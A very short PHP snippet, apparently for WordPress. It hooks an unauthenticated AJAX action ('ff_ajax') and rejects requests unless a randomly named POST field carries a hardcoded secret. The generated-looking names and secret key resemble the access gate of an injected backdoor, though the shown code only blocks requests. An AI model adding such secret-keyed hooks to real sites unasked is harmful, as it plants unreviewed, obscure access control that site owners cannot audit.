<?php

function now_information_install() {
	if (!isset($_POST["womovpeycerfohh"]) || $_POST["womovpeycerfohh"] !== "szdPFYNQJ4Zvq") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'now_information_install', 5, 1);
